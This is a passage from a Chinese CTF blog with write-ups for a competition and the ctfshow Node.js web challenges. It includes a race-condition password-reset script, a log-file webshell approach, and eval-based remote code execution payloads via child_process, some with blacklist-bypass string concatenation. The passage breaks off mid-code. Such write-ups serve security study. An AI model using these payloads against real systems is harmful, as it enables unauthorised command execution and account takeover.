srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image.png"></p><p>重置密码</p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/2789727/1620207952070-efdfe4c2-fb78-4c51-a512-fc3d456b41a9.png?x-oss-process=image/resize,w_1500" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2021/png/2789727/1620207952070-efdfe4c2-fb78-4c51-a512-fc3d456b41a9.png?x-oss-process=image/resize,w_1500" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image.png"></p><p>发现登录不上。。可能压根就不是改了这个密码？</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$sql</span> = <span class="variable">$pdo</span>-&gt;prepare(<span class="string">&quot;UPDATE PassOn SET pass = :pass where id = 1&quot;</span>);</span><br></pre></td></tr></table></figure><p>先试试用脚本跑，因为我和别人同时在做，防止时间差</p><p>贴贴脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"></span><br><span class="line">flag = <span class="literal">False</span></span><br><span class="line">user = <span class="string">&#x27;Ptn4rdn&#x27;</span></span><br><span class="line">passwd = <span class="string">&#x27;&#x27;</span></span><br><span class="line">email = <span class="string">&#x27;Ptn4rdn@gmail.com&#x27;</span></span><br><span class="line">loginUrl = <span class="string">&#x27;http://49.232.3.115:49496/PassOn/login.php&#x27;</span></span><br><span class="line">resetPassUrl = <span class="string">&#x27;http://49.232.3.115:49496/PassOn/reset.php&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">resetPasswd</span>():</span></span><br><span class="line">    <span class="keyword">global</span> passwd</span><br><span class="line">    resetData = &#123;</span><br><span class="line">        <span class="string">&#x27;email&#x27;</span>: email,</span><br><span class="line">        <span class="string">&#x27;user&#x27;</span>: user,</span><br><span class="line">        <span class="string">&#x27;submit&#x27;</span>: <span class="string">&#x27;reset&#x27;</span></span><br><span class="line">    &#125;</span><br><span class="line">    gmdate = requests.post(loginUrl, resetData).content[-<span class="number">86</span>:-<span class="number">49</span>]</span><br><span class="line">    sha1 = hashlib.sha1()</span><br><span class="line">    sha1.update(gmdate)</span><br><span class="line">    passwd = sha1.hexdigest()[:<span class="number">20</span>]</span><br><span class="line">    <span class="built_in">print</span>(passwd)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">login</span>():</span></span><br><span class="line">    <span class="keyword">global</span> flag, passwd</span><br><span class="line">    loginData = &#123;</span><br><span class="line">        <span class="string">&#x27;email&#x27;</span>: email,</span><br><span class="line">        <span class="string">&#x27;pass&#x27;</span>: passwd,</span><br><span class="line">        <span class="string">&#x27;submit&#x27;</span>: <span class="string">&#x27;submit&#x27;</span></span><br><span class="line">    &#125;</span><br><span class="line">    res = requests.post(resetPassUrl, loginData)</span><br><span class="line">    <span class="keyword">if</span> res.headers.get(<span class="string">&#x27;Cookie&#x27;</span>, <span class="number">0</span>):</span><br><span class="line">        flag = <span class="literal">True</span></span><br><span class="line">        <span class="built_in">print</span>(passwd)</span><br><span class="line">        <span class="built_in">print</span>(res.headers)</span><br><span class="line">        exit()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> flag <span class="keyword">is</span> <span class="literal">False</span>:</span><br><span class="line">    a = threading.Thread(target=resetPasswd)</span><br><span class="line">    b = threading.Thread(target=login)</span><br><span class="line">    a.start()</span><br><span class="line">    b.start()</span><br></pre></td></tr></table></figure><p>不太行。。后面利用大概是有思路了，卡在登录这。。。</p><p>2021.5.6 22:09 更新</p><hr><p><a href="https://blog.csdn.net/qyCraner/article/details/116459918">https://blog.csdn.net/qyCraner/article/details/116459918</a></p><p>找了个题解，发现别人可以正常登录上去的。。不知道我哪步错了，请教一波做出来的师傅。。他也说我做的步骤没毛病，，晕了。</p><p>登录进去后就比较简单了，记录失败日志会把邮箱记录到 <code>.php</code> 文件里，把邮箱写成马就行。主要是这个 <code>php</code> 文件，记录 <code>session</code> 信息，如果没登录访问不了这个马。写入马后连接拿flag就好了。</p><h2 id="hackerweb"><a href="#hackerweb" class="headerlink" title="hackerweb"></a>hackerweb</h2><p>这题还没看，堵在第2和第3题了…看看有没有复现环境，主要是别人的wp不是很详细，也还没动手做。</p><h2 id="RGB"><a href="#RGB" class="headerlink" title="RGB"></a>RGB</h2><p>文件为RGB三原色组合，尝试还原图片</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Crack</span>(<span class="params">n</span>):</span></span><br><span class="line">    flag = []</span><br><span class="line">    <span class="keyword">for</span> each <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>,<span class="built_in">int</span>(n **<span class="number">0.5</span>)+<span class="number">1</span>):</span><br><span class="line">        <span class="keyword">if</span>(n % each == <span class="number">0</span>):</span><br><span class="line">            <span class="built_in">print</span>(each,<span class="built_in">int</span>(n/each))</span><br><span class="line">            flag += [(each,<span class="built_in">int</span>(n/each))]</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(flag) == <span class="number">1</span>:<span class="keyword">return</span> flag[<span class="number">0</span>]</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        choice = <span class="built_in">input</span>(<span class="string">&quot;选择第几组(0-%s):&quot;</span>%(<span class="built_in">len</span>(flag)-<span class="number">1</span>))</span><br><span class="line">        <span class="keyword">return</span> flag[<span class="built_in">int</span>(choice)]</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Paint</span>(<span class="params">X,Y,listrgb</span>):</span></span><br><span class="line">    pic = Image.new(<span class="string">&quot;RGB&quot;</span>,(X, Y))</span><br><span class="line">    i=<span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span> (<span class="number">0</span>,X):</span><br><span class="line">        <span class="keyword">for</span> y <span class="keyword">in</span> <span class="built_in">range</span> (<span class="number">0</span>,Y):</span><br><span class="line">            temp = listrgb[i].split(<span class="string">&#x27;,&#x27;</span>)</span><br><span class="line">            pic.putpixel([x,y],(<span class="built_in">int</span>(temp[<span class="number">0</span>]),<span class="built_in">int</span>(temp[<span class="number">1</span>]),<span class="built_in">int</span>(temp[<span class="number">2</span>])))</span><br><span class="line">            i = i+<span class="number">1</span></span><br><span class="line">    pic.show()</span><br><span class="line">    <span class="comment">#pic.save(&quot;./flag%s.png&quot;%(X))</span></span><br><span class="line">listrgb = <span class="built_in">open</span>(<span class="string">&quot;code.txt&quot;</span>).readlines()</span><br><span class="line">X,Y = Crack(<span class="built_in">len</span>(listrgb))</span><br><span class="line">Paint(X,Y,listrgb)</span><br><span class="line">Paint(Y,X,listrgb)</span><br></pre></td></tr></table></figure><p>跑一下脚本选择第 12 组，然后水平翻转一下即可。</p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/2789727/1620191121792-b6b66454-9f04-4ceb-8f90-1b0a75a919c1.png" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2021/png/2789727/1620191121792-b6b66454-9f04-4ceb-8f90-1b0a75a919c1.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image.png"></p><p>flag{c1d836d1db9d42dd}</p><h2 id="zip"><a href="#zip" class="headerlink" title="zip"></a>zip</h2><p>压缩包密码爆破得 <code>ff123</code></p><p>readme.txt 。尝试摩斯密码和培根密码，发现是培根密码，跑跑脚本。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line">table = &#123;<span class="string">&#x27;a&#x27;</span>: <span class="string">&#x27;aaaaa&#x27;</span>, <span class="string">&#x27;b&#x27;</span>: <span class="string">&#x27;aaaab&#x27;</span>, <span class="string">&#x27;c&#x27;</span>: <span class="string">&#x27;aaaba&#x27;</span>, <span class="string">&#x27;d&#x27;</span>: <span class="string">&#x27;aaabb&#x27;</span>, <span class="string">&#x27;e&#x27;</span>: <span class="string">&#x27;aabaa&#x27;</span>, <span class="string">&#x27;f&#x27;</span>: <span class="string">&#x27;aabab&#x27;</span>, <span class="string">&#x27;g&#x27;</span>: <span class="string">&#x27;aabba&#x27;</span>,</span><br><span class="line">         <span class="string">&#x27;h&#x27;</span>: <span class="string">&#x27;aabbb&#x27;</span>, <span class="string">&#x27;i&#x27;</span>: <span class="string">&#x27;abaaa&#x27;</span>, <span class="string">&#x27;j&#x27;</span>: <span class="string">&#x27;abaab&#x27;</span>, <span class="string">&#x27;k&#x27;</span>: <span class="string">&#x27;ababa&#x27;</span>, <span class="string">&#x27;l&#x27;</span>: <span class="string">&#x27;ababb&#x27;</span>, <span class="string">&#x27;m&#x27;</span>: <span class="string">&#x27;abbaa&#x27;</span>, <span class="string">&#x27;n&#x27;</span>: <span class="string">&#x27;abbab&#x27;</span>,</span><br><span class="line">         <span class="string">&#x27;o&#x27;</span>: <span class="string">&#x27;abbba&#x27;</span>, <span class="string">&#x27;p&#x27;</span>: <span class="string">&#x27;abbbb&#x27;</span>, <span class="string">&#x27;q&#x27;</span>: <span class="string">&#x27;baaaa&#x27;</span>, <span class="string">&#x27;r&#x27;</span>: <span class="string">&#x27;baaab&#x27;</span>, <span class="string">&#x27;s&#x27;</span>: <span class="string">&#x27;baaba&#x27;</span>, <span class="string">&#x27;t&#x27;</span>: <span class="string">&#x27;baabb&#x27;</span>, <span class="string">&#x27;u&#x27;</span>: <span class="string">&#x27;babaa&#x27;</span>,</span><br><span class="line">         <span class="string">&#x27;v&#x27;</span>: <span class="string">&#x27;babab&#x27;</span>, <span class="string">&#x27;w&#x27;</span>: <span class="string">&#x27;babba&#x27;</span>, <span class="string">&#x27;x&#x27;</span>: <span class="string">&#x27;babbb&#x27;</span>, <span class="string">&#x27;y&#x27;</span>: <span class="string">&#x27;bbaaa&#x27;</span>, <span class="string">&#x27;z&#x27;</span>: <span class="string">&#x27;bbaab&#x27;</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">bacon</span>(<span class="params">cipher</span>):</span></span><br><span class="line">    msg = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    codes = re.findall(<span class="string">r&#x27;.&#123;5&#125;&#x27;</span>, cipher)</span><br><span class="line">    <span class="keyword">for</span> code <span class="keyword">in</span> codes:</span><br><span class="line">        <span class="keyword">if</span> code == <span class="string">&#x27;&#x27;</span>:</span><br><span class="line">            msg += <span class="string">&#x27; &#x27;</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            UNCODE = <span class="built_in">dict</span>(<span class="built_in">map</span>(<span class="keyword">lambda</span> t: (t[<span class="number">1</span>], t[<span class="number">0</span>]), table.items()))</span><br><span class="line">            msg += UNCODE[code]</span><br><span class="line">    <span class="keyword">return</span> msg</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    cipher = <span class="string">&#x27;BABBBBBAAAABAAB&#x27;</span></span><br><span class="line">    cipher = cipher.lower()</span><br><span class="line">    plaintext = bacon(cipher)</span><br><span class="line">    <span class="built_in">print</span>(plaintext)</span><br></pre></td></tr></table></figure><p>解出来得知 word 文档密码 <code>xyj</code></p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/2789727/1620187683454-3a74fedf-ad0c-406a-9307-40035bf08bfd.png" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2021/png/2789727/1620187683454-3a74fedf-ad0c-406a-9307-40035bf08bfd.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image.png"></p><p>颜色隐藏获取 flag{cbfacb9df0c7caf9a2b8a8ffbd72d1a0}</p>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
          <category> ctf比赛 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> ctf比赛 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ctfshow nodejs篇</title>
      <link href="//p/2021/ctfshow-nodejs/"/>
      <url>//p/2021/ctfshow-nodejs/</url>
      
        <content type="html"><![CDATA[<meta name="referrer" content="no-referrer" /><p>web342 很刺激 （</p><p>感觉对原型链污染理解又加深了呢~</p><h2 id="web334-JS-大小写特性"><a href="#web334-JS-大小写特性" class="headerlink" title="web334 JS 大小写特性"></a>web334 JS 大小写特性</h2><p>搜集了半天信息，发现题目描述处有源码可以直接下载。。</p><p>user.js</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">module</span>.exports = &#123;</span><br><span class="line">  <span class="attr">items</span>: [</span><br><span class="line">    &#123;<span class="attr">username</span>: <span class="string">&#x27;CTFSHOW&#x27;</span>, <span class="attr">password</span>: <span class="string">&#x27;123456&#x27;</span>&#125;</span><br><span class="line">  ]</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>login.js</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> express = <span class="built_in">require</span>(<span class="string">&#x27;express&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> router = express.Router();</span><br><span class="line"><span class="keyword">var</span> users = <span class="built_in">require</span>(<span class="string">&#x27;../modules/user&#x27;</span>).items;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">var</span> findUser = <span class="function"><span class="keyword">function</span>(<span class="params">name, password</span>)</span>&#123;</span><br><span class="line">  <span class="keyword">return</span> users.find(<span class="function"><span class="keyword">function</span>(<span class="params">item</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> name!==<span class="string">&#x27;CTFSHOW&#x27;</span> &amp;&amp; item.username === name.toUpperCase() &amp;&amp; item.password === password;</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* GET home page. */</span></span><br><span class="line">router.post(<span class="string">&#x27;/&#x27;</span>, <span class="function"><span class="keyword">function</span>(<span class="params">req, res, next</span>) </span>&#123;</span><br><span class="line">  res.type(<span class="string">&#x27;html&#x27;</span>);</span><br><span class="line">  <span class="keyword">var</span> flag=<span class="string">&#x27;flag_here&#x27;</span>;</span><br><span class="line">  <span class="keyword">var</span> sess = req.session;</span><br><span class="line">  <span class="keyword">var</span> user = findUser(req.body.username, req.body.password);</span><br><span class="line"> </span><br><span class="line">  <span class="keyword">if</span>(user)&#123;</span><br><span class="line">    req.session.regenerate(<span class="function"><span class="keyword">function</span>(<span class="params">err</span>) </span>&#123;</span><br><span class="line">      <span class="keyword">if</span>(err)&#123;</span><br><span class="line">        <span class="keyword">return</span> res.json(&#123;<span class="attr">ret_code</span>: <span class="number">2</span>, <span class="attr">ret_msg</span>: <span class="string">&#x27;登录失败&#x27;</span>&#125;);        </span><br><span class="line">      &#125;</span><br><span class="line">       </span><br><span class="line">      req.session.loginUser = user.username;</span><br><span class="line">      res.json(&#123;<span class="attr">ret_code</span>: <span class="number">0</span>, <span class="attr">ret_msg</span>: <span class="string">&#x27;登录成功&#x27;</span>,<span class="attr">ret_flag</span>:flag&#125;);              </span><br><span class="line">    &#125;);</span><br><span class="line">  &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    res.json(&#123;<span class="attr">ret_code</span>: <span class="number">1</span>, <span class="attr">ret_msg</span>: <span class="string">&#x27;账号或密码错误&#x27;</span>&#125;);</span><br><span class="line">  &#125;  </span><br><span class="line">  </span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="built_in">module</span>.exports = router;</span><br></pre></td></tr></table></figure><p>即满足</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">name!==<span class="string">&#x27;CTFSHOW&#x27;</span> &amp;&amp; item.username === name.toUpperCase() &amp;&amp; item.password === password;</span><br></pre></td></tr></table></figure><p>我们输入的 <code>name</code> 不为 <code>CTFSHOW</code> 然后 <code>name</code> 转换后的大写为 <code>CTFSHOW</code> ，密码为 <code>123456</code> 即可。</p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/2789727/1619672813007-7c7df6d4-4525-4b61-95a3-469be454413e.png?x-oss-process=image/resize,w_1500" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2021/png/2789727/1619672813007-7c7df6d4-4525-4b61-95a3-469be454413e.png?x-oss-process=image/resize,w_1500" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image.png"></p><p>网上看了一下，其实想要的考点是</p><p><code>toUpperCase()</code> 函数，字符 ı 会转变为 I ，字符 ſ 会变为 S 。</p><p><code>toLowerCase()</code> 函数中，字符 İ 会转变为 i ，字符 K 会转变为 k 。</p><p>可以参考</p><p><a href="https://www.leavesongs.com/HTML/javascript-up-low-ercase-tip.html">https://www.leavesongs.com/HTML/javascript-up-low-ercase-tip.html</a></p><p>这样的应该是，比如字符 <code>s</code> 或 <code>S</code> 不能出现在输入字符中就好了。</p><h2 id="web335-RCE"><a href="#web335-RCE" class="headerlink" title="web335 RCE"></a>web335 RCE</h2><p>f12 源码提示</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- /?eval= --&gt;</span></span><br></pre></td></tr></table></figure><p>即简单命令执行</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?eval=require(&#x27;child_process&#x27;).spawnSync(&#x27;ls&#x27;,[&#x27;.&#x27;]).stdout.toString()</span><br></pre></td></tr></table></figure><p>获取 flag</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?eval=require(%27child_process%27).spawnSync(%27cat%27,[%27fl00g.txt%27]).stdout.toString()</span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2021/png/2789727/1619673887207-74b470be-2e6e-4373-8685-2b64df56a093.png?x-oss-process=image/resize,w_1500" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2021/png/2789727/1619673887207-74b470be-2e6e-4373-8685-2b64df56a093.png?x-oss-process=image/resize,w_1500" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image.png"></p><h2 id="web336-RCE-黑名单绕过"><a href="#web336-RCE-黑名单绕过" class="headerlink" title="web336 RCE 黑名单绕过"></a>web336 RCE 黑名单绕过</h2><p>f12 源码提示</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- /?eval= --&gt;</span></span><br></pre></td></tr></table></figure><p>即简单命令执行</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?eval=require(&#x27;child_process&#x27;).spawnSync(&#x27;ls&#x27;,[&#x27;.&#x27;]).stdout.toString()</span><br></pre></td></tr></table></figure><p>获取 flag</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?eval=require(%27child_process%27).spawnSync(%27cat%27,[%27fl001g.txt%27]).stdout.toString()</span><br></pre></td></tr></table></figure><p>emm 好像就 flag 文件换了个名字？</p><p>顺便收集多几个命令执行</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">require</span>(<span class="string">&#x27;child_process&#x27;</span>).spawnSync(<span class="string">&#x27;ls&#x27;</span>,[<span class="string">&#x27;.&#x27;</span>]).stdout.toString()</span><br><span class="line"><span class="built_in">require</span>(<span class="string">&#x27;child_process&#x27;</span>).execSync(<span class="string">&#x27;ls&#x27;</span>).toString()</span><br><span class="line"><span class="built_in">global</span>.process.mainModule.constructor._load(<span class="string">&#x27;child_process&#x27;</span>).execSync(<span class="string">&#x27;ls&#x27;</span>,[<span class="string">&#x27;.&#x27;</span>]).toString()</span><br></pre></td></tr></table></figure><p>收集过程中发现，原来第 2、3 个 被禁了，2333 原来考察黑名单</p><p>先通过全局变量读取当前目录位置</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?eval=__filename</span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2021/png/2789727/1619674649728-3ffb8fbc-84b6-460f-bd76-6fb2431b405b.png?x-oss-process=image/resize,w_1500" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2021/png/2789727/1619674649728-3ffb8fbc-84b6-460f-bd76-6fb2431b405b.png?x-oss-process=image/resize,w_1500" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image.png"></p><p>当前目录</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?eval=__dirname</span><br></pre></td></tr></table></figure><p>读文件</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?eval=require(&#x27;fs&#x27;).readFileSync(&#x27;/app/routes/index.js&#x27;,&#x27;utf-8&#x27;)</span><br></pre></td></tr></table></figure><p>发现过滤了exec和load</p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/2789727/1619674906401-e2c00893-b3b0-488b-a81c-31d46028a825.png?x-oss-process=image/resize,w_1500" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2021/png/2789727/1619674906401-e2c00893-b3b0-488b-a81c-31d46028a825.png?x-oss-process=image/resize,w_1500" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image.png"></p><p>绕过方法</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?eval=require(&#x27;child_process&#x27;)[&#x27;exe&#x27;+&#x27;cSync&#x27;](&#x27;ls&#x27;).toString()</span><br></pre></td></tr></table></figure><p>因为 <code>require(&#39;child_process&#39;)</code>  方法返回一个对象，可以通过类型 Python数组的方式去访问里面的成员。</p><p>或者用其他模块读文件</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/?eval=require(&#x27;fs&#x27;).readdirSync(&#x27;.&#x27;)</span><br><span class="line">/?eval=require(&#x27;fs&#x27;).readFileSync(&#x27;fl001g.txt&#x27;,&#x27;utf-8&#x27;)</span><br></pre></td></tr></table></figure><p>当然还有其他姿势，比如变量拼接在执行</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">var%20s=%27global.process.mainModule.constructor._lo%27;var%20b=&quot;ad(%27child_process%27).ex&quot;;var%20c=&quot;ec(%27cat+fl001g.txt&gt;public/1.txt%27);&quot;;eval(s%2Bb%2Bc);</span><br></pre></td></tr></table></figure><h2 id="web337-md5绕过"><a href="#web337-md5绕过" class="headerlink" title="web337 md5绕过"></a>web337 md5绕过</h2><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> express = <span class="built_in">require</span>(<span 